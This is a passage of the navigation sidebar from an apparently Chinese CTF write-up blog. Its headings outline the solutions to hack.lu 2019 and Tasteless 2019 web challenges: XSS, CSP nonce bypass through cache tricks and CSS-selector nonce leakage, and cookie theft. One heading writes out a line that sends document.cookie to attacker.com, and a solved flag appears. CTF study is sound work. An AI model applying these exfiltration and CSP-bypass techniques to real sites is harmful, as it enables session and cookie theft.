class="nav-text">但是在，payload中我们无法直接将原型设置为数组，否则我将失去Car类提供的功能。我们可以通过不直接将原型设置为数组，而是将原型设置为数组的对象来避免这种情况。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#现在，新的payload如下："><span class="nav-number">1.4.5.</span> <span class="nav-text">现在，新的payload如下：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#为什么上面的payload能够处理成功，你可以自己体验一波。"><span class="nav-number">1.4.6.</span> <span class="nav-text">为什么上面的payload能够处理成功，你可以自己体验一波。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#使用这个payload我们绕过了MD5的检查，接下来处理到了repairWithHelper函数。"><span class="nav-number">1.4.7.</span> <span class="nav-text">使用这个payload我们绕过了MD5的检查，接下来处理到了repairWithHelper函数。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#在这个函数中我们看到它创建了一个script标签并且设置它的src属性为url提供作为参数传入函数的。"><span class="nav-number">1.4.8.</span> <span class="nav-text">在这个函数中我们看到它创建了一个script标签并且设置它的src属性为url提供作为参数传入函数的。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#使用help参数来控制传入上面函数的参数。"><span class="nav-number">1.4.9.</span> <span class="nav-text">使用help参数来控制传入上面函数的参数。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#接下来我们要面临的是正则表达式，他看起来非常严格。"><span class="nav-number">1.4.10.</span> <span class="nav-text">接下来我们要面临的是正则表达式，他看起来非常严格。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#URL的最后一部分-文件名-只能使用任意的字符。"><span class="nav-number">1.4.11.</span> <span class="nav-text">URL的最后一部分(文件名)只能使用任意的字符。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#经过一些测试，我发现data-URL将与regex匹配data-lt-MIME-Type-gt-charset-lt-Charset-gt-base64-lt-Data-gt"><span class="nav-number">1.4.12.</span> <span class="nav-text">经过一些测试，我发现data-URL将与regex匹配data:[&lt;MIME-Type&gt;][;charset=&lt;Charset&gt;][;base64],&lt;Data&gt;</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#如果它会加载某种垃圾内容类型，则只有不确定性，因为所需的-fluxfingers-net主机名将被放置。"><span class="nav-number">1.4.13.</span> <span class="nav-text">如果它会加载某种垃圾内容类型，则只有不确定性，因为所需的*.fluxfingers.net主机名将被放置。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#令人惊讶的是他执行了，并且弹出了一个alert-并且help设置如下："><span class="nav-number">1.4.14.</span> <span class="nav-text">令人惊讶的是他执行了，并且弹出了一个alert()并且help设置如下：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#更新的payload"><span class="nav-number">1.4.15.</span> <span class="nav-text">更新的payload:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#现在我们有了完整的利用链。唯一缺少的部分就是读取flag"><span class="nav-number">1.4.16.</span> <span class="nav-text">现在我们有了完整的利用链。唯一缺少的部分就是读取flag</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#解决"><span class="nav-number">1.4.17.</span> <span class="nav-text">解决:</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#最终的payload，成功读取到flag，如下图："><span class="nav-number">1.4.17.1.</span> <span class="nav-text">最终的payload，成功读取到flag，如下图：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#它提取cookie并将其作为URL的一部分发送fetch给我们控制的HTTP端点。RequestBin-com和类似的网站对此非常有用。在这里，我们可以检查请求，并查看有效负载URL的访问者将发送什么。"><span class="nav-number">1.4.18.</span> <span class="nav-text">它提取cookie并将其作为URL的一部分发送fetch给我们控制的HTTP端点。RequestBin.com和类似的网站对此非常有用。在这里，我们可以检查请求，并查看有效负载URL的访问者将发送什么。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#最后我们得到了正确的flag：-flag-brumm-brumm-brumm-brumm-brumm-brumm-brumm"><span class="nav-number">1.4.19.</span> <span class="nav-text">最后我们得到了正确的flag： flag{brumm_brumm_brumm_brumm_brumm_brumm_brumm}</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Numtonce"><span class="nav-number">1.5.</span> <span class="nav-text">Numtonce</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#题目的地址-https-fluxfingersforfuture-fluxfingers-net-challenges-29"><span class="nav-number">1.5.1.</span> <span class="nav-text">题目的地址:https://fluxfingersforfuture.fluxfingers.net/challenges/29</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#题目描述"><span class="nav-number">1.5.2.</span> <span class="nav-text">题目描述</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#面对世界上所有的坏消息，每个人都需要一个安静的地方来放松心情。"><span class="nav-number">1.5.2.1.</span> <span class="nav-text">面对世界上所有的坏消息，每个人都需要一个安静的地方来放松心情。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们建立了一个-但是你必须来帮助我们保证它安全。如果你发现一个危险，告诉这个森林守护者，它将把cookie发送给你。"><span class="nav-number">1.5.2.2.</span> <span class="nav-text">我们建立了一个,但是你必须来帮助我们保证它安全。如果你发现一个危险，告诉这个森林守护者，它将把cookie发送给你。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#TL-DR"><span class="nav-number">1.5.3.</span> <span class="nav-text">TL;DR</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#可以通过URL哈希实现XSS。但是已经设置CSP，因此不允许使用外部脚本。"><span class="nav-number">1.5.3.1.</span> <span class="nav-text">可以通过URL哈希实现XSS。但是已经设置CSP，因此不允许使用外部脚本。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#除非随机数-nonce-标签是正确的。想法是通过从缓存中加载网站来强制刷新后使nonce标签来保持相同。"><span class="nav-number">1.5.3.2.</span> <span class="nav-text">除非随机数(nonce)标签是正确的。想法是通过从缓存中加载网站来强制刷新后使nonce标签来保持相同。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#js-css-image文件是从缓存中加载的，但是这个index-php文件不是。"><span class="nav-number">1.5.3.3.</span> <span class="nav-text">js/css/image文件是从缓存中加载的，但是这个index.php文件不是。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#但是我们可以在url的后面附加一个css文件来从缓存中强制加载index-php文件"><span class="nav-number">1.5.3.4.</span> <span class="nav-text">但是我们可以在url的后面附加一个css文件来从缓存中强制加载index.php文件</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#例如下面的链接http-url-com-index-php-blub-css。"><span class="nav-number">1.5.3.5.</span> <span class="nav-text">例如下面的链接http://url.com/index.php/blub.css。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#index-php将会加载，然后这个代理服务器将他作为一个css文件并且加载index-php文件的缓存版本。"><span class="nav-number">1.5.3.6.</span> <span class="nav-text">index.php将会加载，然后这个代理服务器将他作为一个css文件并且加载index.php文件的缓存版本。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#因此现在我们提前知道了随机数-nonce-，现在我们可以执行我们的自定义js代码。"><span class="nav-number">1.5.3.7.</span> <span class="nav-text">因此现在我们提前知道了随机数(nonce)，现在我们可以执行我们的自定义js代码。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#完善payload："><span class="nav-number">1.5.4.</span> <span class="nav-text">完善payload：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#通过阅读上面的描述，我们的目标似乎是去盗窃这个cookie从浏览器。"><span class="nav-number">1.5.4.1.</span> <span class="nav-text">通过阅读上面的描述，我们的目标似乎是去盗窃这个cookie从浏览器。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#通常，这是通过将自定义的javascript代码注入网站-xss-并且通过一段代码将Cookie发送到攻击者控制的服务器来完成的。"><span class="nav-number">1.5.4.2.</span> <span class="nav-text">通常，这是通过将自定义的javascript代码注入网站(xss)并且通过一段代码将Cookie发送到攻击者控制的服务器来完成的。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#森林守护者网站也仅仅是一个文本字段，用于代替URL。"><span class="nav-number">1.5.4.3.</span> <span class="nav-text">森林守护者网站也仅仅是一个文本字段，用于代替URL。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#然后xss-bot将会带着cookie访问这些URL，而那个flag就在cookie里面。"><span class="nav-number">1.5.4.4.</span> <span class="nav-text">然后xss bot将会带着cookie访问这些URL，而那个flag就在cookie里面。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#现在我们开始构造poc去攻击。"><span class="nav-number">1.5.4.5.</span> <span class="nav-text">现在我们开始构造poc去攻击。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#1-伪造一个可以触发自定义javascript的URL，以将Cookie发送到我们控制的服务器。"><span class="nav-number">1.5.4.6.</span> <span class="nav-text">1. 伪造一个可以触发自定义javascript的URL，以将Cookie发送到我们控制的服务器。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-将该URL提交给我们的森林bot。"><span class="nav-number">1.5.4.7.</span> <span class="nav-text">2. 将该URL提交给我们的森林bot。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-查看我们的服务器日志获取窃取的cookie。"><span class="nav-number">1.5.4.8.</span> <span class="nav-text">3. 查看我们的服务器日志获取窃取的cookie。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#4-拿到cookie中的flag。"><span class="nav-number">1.5.4.9.</span> <span class="nav-text">4. 拿到cookie中的flag。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#从这个网站本身来看，这似乎非常简单。因为他只有一页，并且源代码几乎只有下面的javascript代码。"><span class="nav-number">1.5.5.</span> <span class="nav-text">从这个网站本身来看，这似乎非常简单。因为他只有一页，并且源代码几乎只有下面的javascript代码。</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#阅读这个代码，可以看到由于这个document-write-o0o-可能在URL上进行XSS。"><span class="nav-number">1.5.5.1.</span> <span class="nav-text">阅读这个代码，可以看到由于这个document.write(o0o),可能在URL上进行XSS。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#回顾这个o0o可以看到这个是由-号后面的组件生成的，那么我们可以用下面的url进行注入。"><span class="nav-number">1.5.5.2.</span> <span class="nav-text">回顾这个o0o可以看到这个是由#号后面的组件生成的，那么我们可以用下面的url进行注入。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#下一步是去尝试嵌入我们的javascript代码。但是有CSP的保护。"><span class="nav-number">1.5.5.3.</span> <span class="nav-text">下一步是去尝试嵌入我们的javascript代码。但是有CSP的保护。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#将CSP标头设置为不允许脚本执行，除非nonce标签或者script的sha256是正确的："><span class="nav-number">1.5.5.4.</span> <span class="nav-text">将CSP标头设置为不允许脚本执行，除非nonce标签或者script的sha256是正确的：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#nonce是一个随机的令牌，只要网站重新加载那么他就会重新生成。"><span class="nav-number">1.5.5.5.</span> <span class="nav-text">nonce是一个随机的令牌，只要网站重新加载那么他就会重新生成。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这两个选项对我们来说都是不太可能的-https-csp-evaluator-withgoogle-com-，因此我们开始尝试去理解剩下的代码。"><span class="nav-number">1.5.5.6.</span> <span class="nav-text">这两个选项对我们来说都是不太可能的(https://csp-evaluator.withgoogle.com/)，因此我们开始尝试去理解剩下的代码。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#一段时间后js-css-image文件的响应头有点奇怪。"><span class="nav-number">1.5.5.7.</span> <span class="nav-text">一段时间后js/css/image文件的响应头有点奇怪。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这是当我们注意到js-css-images文件是从缓存中加载的。他们还有一个Age标头该标头在10分钟后过期。"><span class="nav-number">1.5.5.8.</span> <span class="nav-text">这是当我们注意到js/css/images文件是从缓存中加载的。他们还有一个Age标头该标头在10分钟后过期。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这个想法突然出现，如果我们设法从缓存中加载index-php，那么令牌将在10分钟是有效的。"><span class="nav-number">1.5.5.9.</span> <span class="nav-text">这个想法突然出现，如果我们设法从缓存中加载index.php，那么令牌将在10分钟是有效的。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们尝试去加载这个index-php文件通过设置一些特殊的标头-Cache-Control等等-。"><span class="nav-number">1.5.5.10.</span> <span class="nav-text">我们尝试去加载这个index.php文件通过设置一些特殊的标头(Cache-Control等等)。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#但是都是没有用的，并且xss-bot也没有设置它们。"><span class="nav-number">1.5.5.11.</span> <span class="nav-text">但是都是没有用的，并且xss bot也没有设置它们。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#与另一个头文件一样Server-nginx，我们查询了如何在nginx上设置基本缓存。基本上，将正则表达式过滤器应用于网址，如果匹配，文件将被缓存。"><span class="nav-number">1.5.5.12.</span> <span class="nav-text">与另一个头文件一样Server: nginx，我们查询了如何在nginx上设置基本缓存。基本上，将正则表达式过滤器应用于网址，如果匹配，文件将被缓存。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#因此，我们尝试伪造以-css结尾但仍加载index-php的URL。经过反复试验，我们伪造了以下网址："><span class="nav-number">1.5.5.13.</span> <span class="nav-text">因此，我们尝试伪造以.css结尾但仍加载index.php的URL。经过反复试验，我们伪造了以下网址：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#成功！nonce-token始终相同，并且响应具有所有缓存标头！"><span class="nav-number">1.5.5.14.</span> <span class="nav-text">成功！nonce token始终相同，并且响应具有所有缓存标头！</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#尝试以下操作，我们将用xss弹出一个alert-1-nonce-是先前响应头中的CSP-nonce令牌-："><span class="nav-number">1.5.5.15.</span> <span class="nav-text">尝试以下操作，我们将用xss弹出一个alert(1)({nonce}是先前响应头中的CSP nonce令牌)：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#但是尝试去发送cookie到我们的服务器上用ajax或者img的src，但是没有用"><span class="nav-number">1.5.5.16.</span> <span class="nav-text">但是尝试去发送cookie到我们的服务器上用ajax或者img的src，但是没有用</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#但是由于CSP再次尝试通过ajax或img-src将cookie发送到我们的服务器，因此无法正常工作。因此，我们再次使用了相同的技巧，并使用正确的nonce编写了一个脚本标签："><span class="nav-number">1.5.5.17.</span> <span class="nav-text">但是由于CSP再次尝试通过ajax或img src将cookie发送到我们的服务器，因此无法正常工作。因此，我们再次使用了相同的技巧，并使用正确的nonce编写了一个脚本标签：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#后来想了一下，document-location-https-attacker-com-cookie-39-document-cookie-39-也是可以的。"><span class="nav-number">1.5.5.18.</span> <span class="nav-text">后来想了一下，document.location=https://attacker.com/cookie=&#39;+document.cookie+&#39;也是可以的。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#最终的payload"><span class="nav-number">1.5.6.</span> <span class="nav-text">最终的payload:</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#nonce-是先前响应标头中具有相同URL的CSP-nonce令牌"><span class="nav-number">1.5.6.1.</span> <span class="nav-text">{nonce}是先前响应标头中具有相同URL的CSP nonce令牌</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Lessons-learned"><span class="nav-number">1.5.7.</span> <span class="nav-text">Lessons learned</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#Check-and-understand-the-CSP-We-would-have-saved-a-looot-of-time-if-we-understood-the-CSP-correctly-straight-away-As-default-src-was-set-to-none-We-should-have-noticed-that-it-is-impossible-to-include-any-external-resource-Meaning-that-even-if-we-would-have-found-some-unsafe-javascript-code-inside-the-website-itself-it-would-still-have-been-impossible-to-send-the-cookie-to-an-external-server-The-only-exceptions-to-be-able-to-contact-an-external-server-would-be-if-the-nonce-of-a-script-tag-is-correct-or-the-sha256-of-the-external-script-would-be-correct-As-it-is-impossible-to-find-sha256-collisions-finding-a-correct-nonce-is-the-only-possible-solution-So-no-matter-what-we-tried-to-do-we-sould-have-noticed-from-the-beginning-that-we-needed-to-force-a-valid-nonce"><span class="nav-number">1.5.7.1.</span> <span class="nav-text">Check and understand the CSP! We would have saved a looot of time if we understood the CSP correctly straight away. As default-src was set to none. We should have noticed that it is impossible to include any external resource. Meaning that even if we would have found some unsafe javascript code inside the website itself, it would still have been impossible to send the cookie to an external server! The only exceptions to be able to contact an external server would be if the nonce of a script tag is correct or the sha256 of the external script would be correct. As it is impossible to find sha256 collisions, finding a correct nonce is the only possible solution. So no matter what we tried to do, we sould have noticed from the beginning that we needed to force a valid nonce!</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Tasteless-2019-Gabbr"><span class="nav-number">1.6.</span> <span class="nav-text">Tasteless 2019 - Gabbr</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#题目类型：CSP，CSS"><span class="nav-number">1.6.1.</span> <span class="nav-text">题目类型：CSP，CSS</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#总览"><span class="nav-number">1.6.2.</span> <span class="nav-text">总览</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#gabbr是一个在线聊天室服务。当页面加载后，人们加入URL的哈希部分指定的聊天室例如："><span class="nav-number">1.6.2.1.</span> <span class="nav-text">gabbr是一个在线聊天室服务。当页面加载后，人们加入URL的哈希部分指定的聊天室例如：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#如果没有指定名称，则在加入时会随机生成一个UUID。"><span class="nav-number">1.6.2.2.</span> <span class="nav-text">如果没有指定名称，则在加入时会随机生成一个UUID。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#主要的功能是在聊天室中发送消息。此外，可以将用户名更改为另一个随机的用户名，加入新的随机聊天室并将该聊天室报告给管理员。"><span class="nav-number">1.6.2.3.</span> <span class="nav-text">主要的功能是在聊天室中发送消息。此外，可以将用户名更改为另一个随机的用户名，加入新的随机聊天室并将该聊天室报告给管理员。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#报告后，管理员将加入聊天室并在聊天室中待15秒。另外，聊天室是基于websockets。"><span class="nav-number">1.6.2.4.</span> <span class="nav-text">报告后，管理员将加入聊天室并在聊天室中待15秒。另外，聊天室是基于websockets。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#利用"><span class="nav-number">1.6.3.</span> <span class="nav-text">利用</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#收集信息-例如NSA"><span class="nav-number">1.6.3.1.</span> <span class="nav-text">收集信息(例如NSA)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#消息没有被清除，即可以注入任意的HTML。但是，CSP策略具有严格的限制："><span class="nav-number">1.6.3.2.</span> <span class="nav-text">消息没有被清除，即可以注入任意的HTML。但是，CSP策略具有严格的限制：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#仅当脚本具有正确的nonce属性时才执行脚本标签。"><span class="nav-number">1.6.3.3.</span> <span class="nav-text">仅当脚本具有正确的nonce属性时才执行脚本标签。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这个nonce在每次页面加载时在服务器端生成，并且在CSP中指定为script-src-39-nonce-cff855cb552d6be6be760496-39-。"><span class="nav-number">1.6.3.4.</span> <span class="nav-text">这个nonce在每次页面加载时在服务器端生成，并且在CSP中指定为script-src &#39;nonce-cff855cb552d6be6be760496&#39;;。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这会阻止其他的尝试和技巧去执行javascript代码像那些事件处理程序。"><span class="nav-number">1.6.3.5.</span> <span class="nav-text">这会阻止其他的尝试和技巧去执行javascript代码像那些事件处理程序。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#因此，要执行javascript代码，需要知道nonce在加载页面时的值-也就是24个字符-，这显然我们是无法从管理员哪里轻松获取的。"><span class="nav-number">1.6.3.6.</span> <span class="nav-text">因此，要执行javascript代码，需要知道nonce在加载页面时的值(也就是24个字符)，这显然我们是无法从管理员哪里轻松获取的。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们现在可以做的是，虽然是加载任意的CSS和图像style-src被设置为unsafe-inline和img-src是-但是它有一些有趣的攻击方式。"><span class="nav-number">1.6.3.7.</span> <span class="nav-text">我们现在可以做的是，虽然是加载任意的CSS和图像style-src被设置为unsafe-inline和img-src是*但是它有一些有趣的攻击方式。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#获取随机数"><span class="nav-number">1.6.4.</span> <span class="nav-text">获取随机数</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#在网上搜索我们的想法时，我们偶然发现了2016年以来的这篇文章："><span class="nav-number">1.6.4.1.</span> <span class="nav-text">在网上搜索我们的想法时，我们偶然发现了2016年以来的这篇文章：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-sirdarckcat-blogspot-com-2016-12-how-to-bypass-csp-nonces-with-dom-xss-html其作者描述了攻击者可以使用css提取其内容。"><span class="nav-number">1.6.4.2.</span> <span class="nav-text">https://sirdarckcat.blogspot.com/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html其作者描述了攻击者可以使用css提取其内容。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这是非常合适的，因为我们可以注入任意的CSS！因此我们像适当的黑客一样，复制了他的脚本。"><span class="nav-number">1.6.4.3.</span> <span class="nav-text">这是非常合适的，因为我们可以注入任意的CSS！因此我们像适当的黑客一样，复制了他的脚本。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#但是，给定的选择器不起作用。"><span class="nav-number">1.6.4.4.</span> <span class="nav-text">但是，给定的选择器不起作用。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#因此我们自己开始自行的调试选择器。"><span class="nav-number">1.6.4.5.</span> <span class="nav-text">因此我们自己开始自行的调试选择器。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#之后我们尝试去匹配script标签使用Chrome失败时，我们注意到了一些奇怪的现象："><span class="nav-number">1.6.4.6.</span> <span class="nav-text">之后我们尝试去匹配script标签使用Chrome失败时，我们注意到了一些奇怪的现象：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Chrome加载后将其nonce从script-tag中删除。"><span class="nav-number">1.6.4.7.</span> <span class="nav-text">Chrome加载后将其nonce从script-tag中删除。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#但是。Firefox将nonce保存早DOM树中。"><span class="nav-number">1.6.4.8.</span> <span class="nav-text">但是。Firefox将nonce保存早DOM树中。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#幸运的是，攻击者使用的是Firefox，我们是从管理员的user-agent头中发现的。"><span class="nav-number">1.6.4.9.</span> <span class="nav-text">幸运的是，攻击者使用的是Firefox，我们是从管理员的user-agent头中发现的。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们的第一种方法是script直接匹配标记：script-nonce-quot-a-quot-。"><span class="nav-number">1.6.4.10.</span> <span class="nav-text">我们的第一种方法是script直接匹配标记：script[nonce^=&quot;a&quot;]。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这应将任何script标记与以开头的nonce匹配a。"><span class="nav-number">1.6.4.11.</span> <span class="nav-text">这应将任何script标记与以开头的nonce匹配a。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#但是，这没有按预期工作。经过大量的实验和错误，我们发现你不能直接匹配script标签，但是在选择其他元素时可以将其用作选择器的一部分。因此我们决定使用类似这样的兄弟选择器：script-nonce-quot-s-quot-nav。"><span class="nav-number">1.6.4.12.</span> <span class="nav-text">但是，这没有按预期工作。经过大量的实验和错误，我们发现你不能直接匹配script标签，但是在选择其他元素时可以将其用作选择器的一部分。因此我们决定使用类似这样的兄弟选择器：script[nonce^=&quot;%s&quot;] ~ nav。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#因为nav和script是兄弟标签，所以效果很好。"><span class="nav-number">1.6.4.13.</span> <span class="nav-text">因为nav和script是兄弟标签，所以效果很好。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#使用以上的方法，我们可以发送如下的消息："><span class="nav-number">1.6.5.</span> <span class="nav-text">使用以上的方法，我们可以发送如下的消息：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#仅当至少一个元素与选择器匹配时才触发-因此，仅执行-quot-正确-quot-请求-。假设第一个字符是a，那么我们的下一个payload如下："><span class="nav-number">1.6.5.1.</span> <span class="nav-text">仅当至少一个元素与选择器匹配时才触发(因此，仅执行&quot;正确&quot;请求)。假设第一个字符是a，那么我们的下一个payload如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们可以重复此过程24次，以爆破出这个nonce。"><span class="nav-number">1.6.5.2.</span> <span class="nav-text">我们可以重复此过程24次，以爆破出这个nonce。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们使用python实现了一个攻击服务器，该服务器接收成功的请求，并如上所述向聊天室发送另外一个消息，询问下一个字符。通过连接到聊天室的websocket，将下一个有效的payload直接发送到聊天室。"><span class="nav-number">1.6.5.3.</span> <span class="nav-text">我们使用python实现了一个攻击服务器，该服务器接收成功的请求，并如上所述向聊天室发送另外一个消息，询问下一个字符。通过连接到聊天室的websocket，将下一个有效的payload直接发送到聊天室。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#但是，在尝试后，我们注意到仅仅发送了第一个请求。这是因为后续的CSS注入与以前的CSS规则具有相同的特异性。这意味着包含再次执行后台获取。我们通过手动设置一组从最小到最重要的24个选择器来解决这个问题。"><span class="nav-number">1.6.5.4.</span> <span class="nav-text">但是，在尝试后，我们注意到仅仅发送了第一个请求。这是因为后续的CSS注入与以前的CSS规则具有相同的特异性。这意味着包含再次执行后台获取。我们通过手动设置一组从最小到最重要的24个选择器来解决这个问题。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#综上所述，我们设法获得了完整的nonce！"><span class="nav-number">1.6.5.5.</span> <span class="nav-text">综上所述，我们设法获得了完整的nonce！</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#创建漏洞"><span class="nav-number">1.7.</span> <span class="nav-text">创建漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#现在我们有了nonce，我们可以注入script-tags绕过CSP并执行它。但是，直接加载-lt-script-nonce-quot-quot-gt-alert-1-lt-script-gt-不会产生任何效果，因为在页面加载后不会评估-evaluated-脚本。因此，要绕过此限制，我们iframe通过将脚本指定为来将脚本包含在中srcdoc。我们最终的漏洞利用如下所示："><span class="nav-number">1.7.0.1.</span> <span class="nav-text">现在我们有了nonce，我们可以注入script-tags绕过CSP并执行它。但是，直接加载&lt;script nonce=&quot;...&quot;&gt;alert(1);&lt;/script&gt;不会产生任何效果，因为在页面加载后不会评估(evaluated)脚本。因此，要绕过此限制，我们iframe通过将脚本指定为来将脚本包含在中srcdoc。我们最终的漏洞利用如下所示：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#注意，我们试图加载图像而不是直接发送请求，因为后者被CSP阻止。幸运的是，CSP允许加载任何来源的图像。"><span class="nav-number">1.7.0.2.</span> <span class="nav-text">注意，我们试图加载图像而不是直接发送请求，因为后者被CSP阻止。幸运的是，CSP允许加载任何来源的图像。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Putting-it-all-together"><span class="nav-number">1.7.1.</span> <span class="nav-text">Putting it all together</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#Our-final-approach-was-the-following"><span class="nav-number">1.7.1.1.</span> <span class="nav-text">Our final approach was the following:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#1-Enter-a-chatroom-using-Chrome-so-that-we-are-unaffected-by-the-exploit"><span class="nav-number">1.7.1.2.</span> <span class="nav-text">1. Enter a chatroom using Chrome so that we are unaffected by the exploit</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-Start-the-exploit-server-pointed-at-the-chatroom"><span class="nav-number">1.7.1.3.</span> <span class="nav-text">2. Start the exploit server pointed at the chatroom</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-Report-the-chatroom-and-wait-for-the-admin-to-join"><span class="nav-number">1.7.1.4.</span> <span class="nav-text">3. Report the chatroom and wait for the admin to join</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#4-Send-the-initial-CSS-payload-manually-through-the-browser"><span class="nav-number">1.7.1.5.</span> <span class="nav-text">4. Send the initial CSS payload manually through the browser.</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#5-Let-the-server-handle-the-rest"><span class="nav-number">1.7.1.6.</span> <span class="nav-text">5. Let the server handle the rest</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Below-is-the-final-script-that-ran-on-the-server"><span class="nav-number">1.7.1.7.</span> <span class="nav-text">Below is the final script that ran on the server:</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#hack-lu-2019-Trees-For-Future"><span class="nav-number">1.8.</span> <span class="nav-text">hack.lu 2019 - Trees For 